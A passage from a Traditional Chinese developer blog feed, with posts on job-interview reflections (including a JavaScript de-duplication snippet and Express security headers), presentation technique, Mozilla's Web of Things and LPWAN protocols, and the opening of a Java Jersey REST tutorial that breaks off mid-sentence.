面試心得</h2><p>結果: 感謝信，原因自己覺得是平常沒有著重在這種簡單算法的練習，大多是做文件的閱讀及範例修改，一緊張就腦袋空白對基本的用法也還沒達到肌肉記憶，再來像是 cookies 這種沒在專案上用過的名詞，根本基礎及底層的操弄都不甚了解，事後有練習使用看看，也針對<a href="https://linyencheng.github.io/2019/01/22/js-cookie/">相關的設置去實作(點我看說明)</a>。</p><p>另外一個失敗的原因，我事後有想到信中有提醒，在做解答前要先盡量跟大家解釋再開始進行，然後我一緊張就忘記這個部分，然後直接做的可能也沒有做出他們想要看的，這在短暫的面試中可能不是很好的一個表現，我們畢竟就是要快速交換訊息，明確快速地讓對方了解我們的程度。</p><p>後來 12 月的時候聽了 google 校園說明會，google 很聰明只辦在四所大學，也因為在南部工作的關係，所以就是參加母校的場次，當天請了軟體、硬體的工程師來分享面試要注意的小事情，結果提醒的就跟剛提到的一樣，面試或是工作上最重要的不是回答問題，而是澄清問題，澄清的概念是理解對方想知道什麼。若是無法在短時間內澄清，就需要先在心裡建立好一些限制跟路徑。</p><p>約女孩子來說，如果聖誕節拒絕，那跨年呢???(誤)，如果兩次都拒絕但生日當天可以，我們該做什麼樣的行動。澄清問題的時候也可以藉機了解我們能夠使用哪些資源，譬如女孩子喜歡看喜劇片還是恐怖片，再來是考慮特殊案例，譬如約妹結果定位好的餐廳剛好兩家都沒開，我們該怎麼處理? 火車或高鐵又剛好誤點，導致演唱會超過入場時間飯又沒吃怎麼辦? 總不能一次約會就因為這些特殊案例就爆了吧?</p><p>以軟體工程師來說，就是要確認能不能使用函式庫或是框架。接著行動也就是寫 code 的部分，這部分也不要急，應該先溝通想法，先把可能的做法說一遍，然後想一下有沒有更好的解法? 更好的評估方式可以用時間或是空間複雜度來評估，中小企業工作上，我覺得可以用易讀性和簡易的程度。接著當然是實作比較好的方法，簡單實作完畢後再來是考慮特殊案例，並且用特殊案例去測試， 在工作或面試的時候，用特殊案例去測一下程式，我想會是一個好的習慣。另外 google 本身是做搜尋引擎的，所以只要題目被搜到，那個題目就不會再出了。所以面試的時候，最重要的就是要表現出:</p><ol><li>釐清問題: 問題越簡單越是需要去明確定義，譬如實作一個有最小值的 Stack，那問題就會是我需要連 Stack 都自己實做嗎? 還是只要做 min function 就好?</li><li>確認資源: 我是否可以用現有的 Stack lib 去實作?</li><li>確認預期成果: 可能會用暴力法，每次都全跑一遍，這樣一定可以，但是對方要的嗎?</li><li>評估實作方法: 如果可以用多個 Stack 能不能讓時間複雜度更低?</li><li>測試結果: 丟空值、或是資料中有 null 等等</li></ol><p>其實面試通常很難給 100 分的回答，畢竟大部分的時間都在工作不是在準備面試，所以面試的時候就是把平常解決問題的方法表現出來，讓大家知道我們平常是怎麼在處理問題的，我覺得也不用刻意去演戲或是緊張，上次表現就是腦袋很常出現空白，也不知道為什麼? 大概是辦公室太豪華被嚇到，而且一進門就看到自己的名字顯示在報告的大螢幕上，有夠可怕。</p><p>回到 Oath 的面試，主要分兩部分，第一部分電話面試就問了很多基本題，HTML、CSS、JS 都有，目的大概只是防呆而已，然後 Onsite 的時候會直接請我們介紹目前做的專案，然後針對目前專案去做進一步的詢問(打臉)，這種感覺其實不錯就算這次沒有應徵上，也可以當作改進專案的參考，在以趕時間為主的新創公司來說，其實很多進階一點的部份我在實作上都沒有去仔細考慮，尤其在公司目前就是最有經驗的攻城獅，我沒想其他人大概也不會想 QQ 如果其他人跟我有一樣的困擾，其實還蠻推薦丟履歷過去被電一電的，花一個下午就會知道自己目前專案較不足的地方在哪裡，當作一個顧問時間也很棒。</p><p>過程大致是上四打一，會輪流問各自想問的問題，其中一個是用 react 寫一個自動完成輸入框的流程，這個我寫起來比較不需要思考，就只是寫元件而已。另外一個問題就是考算法類似機智問答，給一個陣列然後去除掉陣列中相同的部分，這方面我還是太弱了，蠻需要練習在閒聊模式之中實作這樣的問題，真的表現得很差，待加強。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> items = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>];</span><br><span class="line"><span class="keyword">let</span> tempItems = items;</span><br><span class="line"></span><br><span class="line">items.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">  items.<span class="title function_">forEach</span>(<span class="function">(<span class="params">itemIn, indexIn</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (item === itemIn &amp;&amp; indexIn &gt; index) &#123;</span><br><span class="line">      tempItems[indexIn] = <span class="string">&quot;repeat&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">tempItems = tempItems.<span class="title function_">filter</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item !== <span class="string">&quot;repeat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tempItems);</span><br></pre></td></tr></table></figure><p>其他還有待加強的像是 cookies 的概念，以及資安相關的基礎知識。簡單的設定可以直接參考 express 的相關說明，但實際上是怎麼運作的就需要再去研究。<br><a href="https://expressjs.com/zh-tw/advanced/best-practice-security.html">https://expressjs.com/zh-tw/advanced/best-practice-security.html</a></p><ul><li>Content-Security-Policy 標頭，以防範跨網站 Scripting 攻擊和其他跨網站注入。</li><li>移除 X-Powered-By 標頭。</li><li>Public Key Pinning 標頭，來防範使用偽造憑證的中間人攻擊。</li><li>Strict-Transport-Security 標頭，以施行安全的 (HTTP over SSL&#x2F;TLS) 伺服器連線。</li><li>X-Download-Options（適用於 IE8+）。</li><li>Cache-Control 和 Pragma 標頭，以停用用戶端快取。</li><li>X-Content-Type-Options，以阻止瀏覽器對脫離所宣告內容類型的回應進行 MIME 探查。</li><li>X-Frame-Options 標頭，以提供 clickjacking 保護。</li><li>X-XSS-Protection，以便在最新的 Web 瀏覽器中啟用跨網站 Scripting (XSS) 過濾器。</li></ul><p>最後也是問一樣的問題，詢問這份工作上最大的成長、快樂、或是價值，得到覺得還蠻棒的答案，答案大概是這樣: “這只是我的想法，跟其他人可能不太相同，在這裡工作十年，也因為一些機會從 web 做到 ios app 現在又回到 app，商城、拍賣不同的商業邏輯也帶給我很多的學習和改變機會，也練習和很多不一樣的人合作，她說她遇到很多厲害的人都是說話讓人很舒服的。”</p><p>這方面我的想法也是這樣，以前的職涯教練、實習遇到的高階主管們、工作上遇到的總經理、董事長，大多給人一種舒服的氣場，做人最高的段數大概就是電人還讓人說謝謝，最後我還有問那她是怎麼推動大家一起工作的?(這就是我現在最想轉換工作的問題 QQ) 畢竟每個人的目標跟想要的不同，有什麼方法或手段嗎? 得到的答案是 “這屬於 soft skill，也就是她這幾年來大量跟不同人合作累積出來的。” 覺得這部分比較可惜的是無法方法論這樣的事情，但本職學能是攻城獅不是主管，這問題大概也很難給出有方法論的答案。</p><p>然後我覺得 HR 其實蠻專業的，雖然感覺年紀輕輕，但她可以在短時間內就確認我的問題(為什麼想在這時候看工作)、確認我目前有沒有其他的打算、理想的狀況(什麼時候可以報到)，也做了 deal 的提案，雖然我表面裝傻，但內心評估她簡直就是一個業務來著，當 HR 簡直委屈了，但如果當作她是在銷售這個職缺的話，其實也蠻稱職的。</p><h2 id="MIT-jobs-快速面試"><a href="#MIT-jobs-快速面試" class="headerlink" title="MIT jobs 快速面試"></a>MIT jobs 快速面試</h2><p>Gogoro 跟 iKala 快速面試，一分鐘迅速交換了一下規格，速度交代踩過的坑，針對這些坑簡單問有鑑別度的問題，不過公司好像都是派工程師或是 HR 出來，可以說是一個人臉投履歷的概念，如果人就在台北其實不妨去參加看看，如果真的錄取了還會有到職獎金。兩家公司問題共同點都是快速介紹 react，有什麼好處和壞處，那為什麼不選擇 Vue?</p><p>iKala 後來有出了一個<a href="https://linyencheng.github.io/thsr-app/">高鐵查詢 SPA 的作業</a>，我在這星期三交出去了，但上周末剛好都有排活動，只好速度找了些時間做，覺得沒有做得很好，有些問題也是事後才發現，他們目前感覺需要會寫測試的人進去，這次的練習我也發現元件的測試好像沒那麼好寫，尤其在用了特殊一點的函式庫後，花了兩個晚上都看不出頭緒。</p><p>事後對方很有誠意的邀請面試，但我研究了各方資料，加上長期有在發樓執行長，所以其實這次作業做完內心有點心虛，於是先暫停了面試流程，想準備好了再上!!!</p><h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><p>面試前要練習寫一些機智問答，在閒聊的模式底下練習。盡可能了解下一份工作自己最想要的是什麼? 在面試的時候旁敲側擊或是單刀直入去看公司能不能給。比較特別的是大家都有稍微看一下部落格來快速了解面試者，從 google analytics 可以看出來那天點擊量爆炸多的。</p><p><img src="/2018/11/12/thinking-interview/interview.png" alt="interview"></p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>簡報與訊息投放技巧</title>
      <link href="/2018/10/08/thinking-message-delivery/"/>
      <url>/2018/10/08/thinking-message-delivery/</url>
      
        <content type="html"><![CDATA[<p>簡報的目的是滿足需求和解決痛點，過程盡量減少非必要資訊，目的是一球入魂 (卡通看太多)，藉由說一個故事，一個容易引起共感的故事進而達到</p><ul><li>知識投放</li><li>塑造意象 (Branding)</li><li>說服他人可實踐的簡單方式</li></ul><h2 id="對象檢核"><a href="#對象檢核" class="headerlink" title="對象檢核"></a>對象檢核</h2><p>簡報目的</p><blockquote><p>針對特定的對象傳遞訊息</p></blockquote><p>特定的對象</p><ul><li>性別</li><li>生活型態</li><li>Apple 使用者</li></ul><p>對象在意的重點</p><ul><li>錢</li><li>功能</li><li>虛榮感</li></ul><p>對方的知識水準</p><ul><li>對講者的了解</li><li>預測對方問題</li></ul><h2 id="故事簡報"><a href="#故事簡報" class="headerlink" title="故事簡報"></a>故事簡報</h2><p>故事簡報有三個重點</p><ul><li>形象塑造: 故事包裝</li><li>架構清晰</li><li>資訊投放量: 記得心理學中 7 ± 2 神奇數字</li></ul><p>如果是 Retargeting，在台下重點人物都知道基本訊息的前提下，就需要更精準的投放資訊:</p><ul><li>事前: 累積足夠資訊</li><li>建立架構並大量捨棄與架構無關的資訊</li><li>將資訊降維並大眾化，讓金魚腦也懂</li></ul><p>很多人做的簡報爛，並不是技巧和能力不足，而是起手式直接打開簡報製作軟體，畢竟架構是不會在軟體中出現。</p><h2 id="故事簡報架構"><a href="#故事簡報架構" class="headerlink" title="故事簡報架構"></a>故事簡報架構</h2><p>首先定義簡報的架構，並且訂下 8 個簡報段落，這份簡報主要透過海賊王尋找祕寶這件事來引起大家的共鳴。</p><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vSHmXyEDm5dVAnKRu3GV2pJSvLbKQ0twlJ_56iBKjGyHwNcO17DOZpr1rI2BueY23qayJAIBu0IYJiP/embed?start=false&loop=false&delayms=3000" frameborder="0" width="480" height="299" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe><ul><li>需求一: 祕寶一<ul><li>解決方案一 (1)</li><li>解決方案二 (2)</li><li>解決方案三 (3)</li></ul></li><li>需求二: 祕寶二<ul><li>解決方案一<ul><li>流程一 (4-1)</li><li>流程二 (4-2)</li><li>流程三 (4-3)</li></ul></li><li>解決方案二<ul><li>方法一 (5)</li><li>方法二 (6)</li></ul></li></ul></li></ul><h3 id="簡報段落"><a href="#簡報段落" class="headerlink" title="簡報段落"></a>簡報段落</h3><p>當架構完成後，確認我們的簡報段落，段落是故事的一段線索，所有線索組合起來，就是完整故事</p><ul><li>讓聽眾清楚了解段落還要多久，給予決定是否專心的選擇 (1&#x2F;5)</li><li>圍繞主題發展段落 (2&#x2F;5)</li><li>想在哪邊請聽眾思考 (3&#x2F;5)</li><li>想在哪邊引起共鳴，給予心靈打擊或共鳴 (4&#x2F;5)</li><li>每個段落建議最多 3 個重點、知識點 (5&#x2F;5)</li></ul><h3 id="簡報內容"><a href="#簡報內容" class="headerlink" title="簡報內容"></a>簡報內容</h3><ul><li>每一頁盡量只提供 1 個重點、知識點</li><li>講解時間抓 1 分鐘</li><li>文字越少越好，人腦對圖 (表) 處理能力 &gt;&gt;&gt; 文字</li></ul><h3 id="簡報主視覺"><a href="#簡報主視覺" class="headerlink" title="簡報主視覺"></a>簡報主視覺</h3><p>當架構和簡報內容圖表決定後就可以開始決定主視覺，目的是形塑<strong>品牌</strong>或<strong>形象經營</strong>:</p><ul><li>品牌色搭配黑白灰: 請想像小七的三個顏色</li><li>營造意象聯想、整體感</li></ul><h2 id="簡報技巧"><a href="#簡報技巧" class="headerlink" title="簡報技巧"></a>簡報技巧</h2><p>簡報開場目的是吸引注意力</p><ul><li>講者本身顏值重要程度五星，生旦淨末<strong>醜</strong>錯惹嗎? 沒有錯，只是不能一直往這裡走 QQ<ul><li>白富美高富帥可隆重介紹華麗登場</li><li>生旦淨末醜放簡短有力的影片開場</li></ul></li><li>講者語調、語速控制<ul><li>男孩子建議加快、增大語調起伏 (對男孩子容忍度跟耐心普遍較低</li><li>女孩子維持原有魅力</li></ul></li><li>了解本身演講風格，以獵人的概念來說像是強化系、變化系、操作系</li><li>量化情緒曲線</li></ul><p>以上目的都是盡可能增加結界壟罩的範圍 (也就是不會睡著的範圍 xddd</p><p>主要就是把架構和段落熟記，多練習個幾次，並且注意:</p><ul><li>找出並記住在放梗的地方做語調變化</li><li>在需要互動的地方停下來讓聽眾休息</li></ul><p>最後，有機會的話，盡量把主導權讓回到聽眾，讓聽眾有機會發現和了解從這次簡報中得到什麼，能打臉兩巴掌還讓人跟我們說謝謝就是真高手了。</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 個人成長 </tag>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web of Things 介紹</title>
      <link href="/2018/05/07/thinking-web-of-things/"/>
      <url>/2018/05/07/thinking-web-of-things/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-of-Things-介紹"><a href="#Web-of-Things-介紹" class="headerlink" title="Web of Things 介紹"></a>Web of Things 介紹</h2><p><a href="https://iot.mozilla.org/about/">Web of Things</a> 在 Mozilla 的相關文件介紹中定義了可讀性較高的 json 格式，一個 geoJSON 的概念，這裡我們姑且就叫 wotJSON ?</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://mywebthingserver.com/things/switch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;On/Off Switch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A web connected switch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;on&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;On/Off&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boolean&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Whether the lamp is turned on&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;links&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/things/switch/properties/on&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>從 ID 可以看出來最終目標是讓每個裝置也能夠有一個 URL 可以進行直接連接，當裝置都與 WebThings Gateway 連接後，就可以透過定義的 REST 的 API 進行裝置的<a href="https://iot.mozilla.org/wot/#actions-resource">互動控制</a>，底層是透過 WebSocket 來保持住連線。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;fade&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span> <span class="number">2000</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/things/lamp/actions/fade/123e4567-e89b-12d3-a456-426655&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;timeRequested&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2017-01-25T15:01:35+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pending&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;reboot&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;href&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/things/lamp/actions/reboot/124e4568-f89b-22d3-a356-427656&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;timeRequested&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2017-01-24T13:13:33+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;timeCompleted&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2017-01-24T13:15:01+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;completed&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>為什麼除了 IoT 以外又多了一個名詞? 先從 IoT 開始看起 IoT 是 Internet of Things 的縮寫，但是當 Things 都連上網之後呢？我們又要怎麼跟 Things 做溝通? 可能的問題：</p><ul><li>裝置的數量會大量上升</li><li>裝置的電量有限</li><li>裝置可能被放置在訊號不佳的位置</li><li>裝置成本會被限制</li></ul><p>目前大多數智慧家庭都是需要一個控制中心，然後透過 App 跟控制中心連結，接著才間接控制裝置，next drive 這家優秀的公司推出了一個 <a href="https://www.nextdrive.io/en/product/Cube-J">cubej</a>，是一個 HEMS Gateway，除了透過 App 也可以透過 Line 來直接的操作，在 App 過多的這個時代，覺得真的是一個高手級的想法，如果想取得裝置的影片更可以直接傳到 Line 裡，並無改變消費者的習慣，簡直偉大設計 RRR，而 Mozilla 則是定出來標準 WebThings Gateway，我覺得可能有三種可以實現的方式。</p><ol><li>智慧音箱: 自從 siri 跟 ok google 出現後，AI 的應用開始越來越多，智慧音箱在對面的發展簡直海放呆丸不知道幾年? AI 有個小關鍵就是需要訓練資料，對岸的資料是幾個億當單位的 Orz 而且是中文！智慧音箱或許也是一個好的 Gateway 的具現化方案</li><li>前端瀏覽器: 如果搭配 <a href="https://www.google.com/intl/en/chrome/demos/speech.html">Chrome 語音輸入的 API</a> 加上熟悉的 REST 來實作一個前端控制介面，也能將資訊圖像化</li><li>聊天機器人: 透過文字互動控制裝置</li></ol><h2 id="波的小常識"><a href="#波的小常識" class="headerlink" title="波的小常識"></a>波的小常識</h2><p>故事剛開始就從射頻開始談起吧? 簡單來看在各種物聯網的情境下，最容易出現的干擾大致可能有：</p><ul><li>遮蔽太厚</li><li>裝置電量有限</li><li>2.4G 干擾</li><li>大電流干擾</li></ul><p>關於遮蔽的問題，可以回到波的特性來看，</p><ul><li>高頻: 可以短時間內傳輸較多的訊號</li><li>低頻: 傳輸速率較慢但有比較高的穿透率</li></ul><p>雖然可以透過調整波形震幅或形狀來達到同個頻率傳遞更多訊號，但同樣條件底下頻率高的傳遞訊號的速度較快，若是需要傳遞同樣的距離則需要更多更大的能量，下圖為本次 LPWAN 主題相關的資訊：</p><p><a href="http://iotbusinessnews.com/WordPress/wp-content/uploads/LPWAN-technologies-chart-range-vs-datarate.jpg">http://iotbusinessnews.com/WordPress/wp-content/uploads/LPWAN-technologies-chart-range-vs-datarate.jpg</a></p><h3 id="電波端協定"><a href="#電波端協定" class="headerlink" title="電波端協定"></a>電波端協定</h3><p><a href="http://www.2cm.com.tw/coverstory_content.asp?sn=1802120004">“智慧電表和家庭閘道器之間的這段通訊與資料傳輸路徑，就是所謂的 B Route，目前傾向於採用具有低功率、抗干擾、長距離傳輸等特性的 Sub-GHz 低功率廣域網路技術(Low Power Wide-Area Network, LPWAN)，例如 LoRa、SigFox、NB-IoT 及 Wi-SUN(Wireless Smart Utility Network)等。 “</a></p><table><thead><tr><th>遠傳</th><th>中華電</th><th>台灣大</th><th>亞太電信</th><th>台灣之星</th></tr></thead><tbody><tr><td>NB-IoT,LoRa</td><td>NB-IoT</td><td>NB-IoT,LoRa?</td><td>LoRa</td><td>NB-IoT</td></tr></tbody></table><p><a href="http://3smarket-info.blogspot.tw/2017/04/lorawan-lora.html">lora</a> 看各家目前技術選型感覺應該是一個備胎的概念 xddd lora 是 long range 主打長距離， 5km up 的樣子?</p><p><a href="https://www.bnext.com.tw/article/46514/sigfox-launch-its-iot-service-in-taiwan">sigfox</a> 用宅配來打比方的話相當於機車宅配便利袋的概念，當送的貨物(資料)較少時就不需要開貨車來送，耗的能量極少當然傳輸資料也很少(1w 5km)，目前中興保全、Obike 好像已經開始使用了，據說有<a href="https://www.bnext.com.tw/article/46514/sigfox-launch-its-iot-service-in-taiwan">040 開頭的電話</a>就是了，算是第一個台灣取得通訊協定執照的？很積極的搶地盤，但這種後發搞不好才有後發優勢，想想當年偉哉 Wi-MAX…</p><p>Wi-SUN (Wireless Smart Utility Network)，目前日本人用在智慧電表的，920MHz 的低頻穿透能力佳傳輸距離可以到達 1km，日本人讚讚讚? 也是 next drive 採用的技術~</p><h3 id="傳輸端協定"><a href="#傳輸端協定" class="headerlink" title="傳輸端協定"></a>傳輸端協定</h3><p>接著就是比較上層的軟體實作，考量到裝置特性:</p><ul><li>每次傳輸量為較小封包(溫度濕度用電量等等)</li><li>裝置數量巨大</li><li>快速</li><li>省電</li></ul><p>目前有幾家領頭羊都覺得自己好棒棒？</p><ul><li>Weave (google)</li><li>AMQP (M$)</li><li>MQTT (amazon 三星)</li><li>HomKit (蘋果)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 開發 RESTful API 入門教學</title>
      <link href="/2018/04/06/java-jersey/"/>
      <url>/2018/04/06/java-jersey/</url>
      
        <content type="html"><![CDATA[<p>幫大家複習開發一個 Web API 提供給前端使用主要流程如下:</p><ol><li>建立 Java Web Appication 並提供 RESTful Web Service</li><li>透過 War 檔發佈至容器: 將程式發佈至伺服器供前端存取</li><li>讓撰寫的 RESTful Web Service 存取實體資料庫</li></ol><p>在前一篇文章整理了網路上教學範例實作心得 <a href="/2018/04/05/java-web/?utm_source=link&utm_medium=article&utm_campaign=internal_link">透過 Java 開發 Web API (RESTful API)</a>，這篇文章將進一步整理 Jersey 在使用上需要了解的六個地方:</p><ol><li>常用的 Annotation</li><li>Filters &amp; Interceptors</li><li>API 權限管理</li><li>NameBinding 和 Dynamic Binding</li><li>JAX-RS Response &amp; Error Message</li><li>Maven 設定</li></ol><h2 id="什麼是-Jersey"><a href="#什麼是-Jersey" class="headerlink" title="什麼是 Jersey?"></a>什麼是 Jersey?</h2><p>Jersey 是基於 JAX-RS 來實現 <a href="https://books.google.com.tw/books?id=zGEYAgAAQBAJ&lpg=PT227&ots=tqA-qA7M1r&dq=ReaderInterceptorContext%20example&pg=PP1#v=onepage&q&f=true">RESTful Web Service</a> 的一個 Framework</p><ul><li>使用大量的 <a href="https://openhome.cc/Gossip/Java/Annotation.html">Annotation</a> 來簡化撰寫</li><li>支援 XML (jaxb) 及 JSON (jackson)</li></ul><p>使用 Jersey 開發 RESTful API 完成後，將應用程式放到任何一種像是 jettyt、Tomcat、JBoss 就能完成 http server 的架設。</p><h2 id="Jersey-RESTful-API-簡單範例"><a href="#Jersey-RESTful-API-簡單範例" class="headerlink" title="Jersey RESTful API 簡單範例"></a>Jersey RESTful API 簡單範例</h2><p>假設今天想要開的 API 路徑是 <code>http://localhost:&#123;PORT&#125;/&#123;專案名稱&#125;/rest/test</code></p><ul><li>@ApplicationPath: 設定應用程式層級的路徑，這個例子中為 <code>rest</code>，透過 Annotation 來幫你分配底層的 Servelt</li><li>@Path(“&#x2F;test”): 定義功能路徑 test</li><li>@GET: 定義 HTTP Method 方法為 Get</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApplicationPath(&quot;/rest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatApplication</span> <span class="keyword">extends</span> <span class="title class_">ResourceConfig</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TomcatApplication</span><span class="params">()</span>&#123;</span><br><span class="line">      property(ServerProperties.WADL_FEATURE_DISABLE, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">      property(ServerProperties.PROVIDER_PACKAGES, <span class="string">&quot;com.web.tomcat.jersey,com.web.tomcat.filter,com.web.tomcat.interceptor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test 則是用 @Path 來設置：</span></span><br><span class="line"><span class="meta">@Path(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRestPractice</span> &#123;</span><br><span class="line">    <span class="meta">@GET</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;hello &gt;////&lt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Jersey-常用的-Annotation"><a href="#Jersey-常用的-Annotation" class="headerlink" title="Jersey 常用的 Annotation"></a>Jersey 常用的 Annotation</h2><p>底下是常用的 Annotation：</p><ul><li>@ApplicationPath: 應用程式層級路徑</li><li>@PATH: 定義路徑</li><li>@GET, @POST, @PUT, @DELETE: http 方法</li><li>@Consumes, @Produces: 定義 MIME</li><li>@PathParam: <code>http://localhost:你開的洞</code> &#x2F;專案名稱&#x2F;rest&#x2F;test&#x2F;我是 PathParam</li><li>@FormParam: 可以用 REST client 製造一個 Form 的 POST</li><li>@QueryParam: <code>http://localhost:你開的洞</code> &#x2F;專案名稱&#x2F;rest&#x2F;test?我是 QueryParam &#x3D; 我的值</li><li>@DefaultValue: 也可以修飾 POJO 裡的變數</li><li>@CookieParam</li><li>@HeaderParam</li></ul><p>進階款：</p><ul><li>@Provider</li><li>@Priority: 利用 <code>@Priority</code> 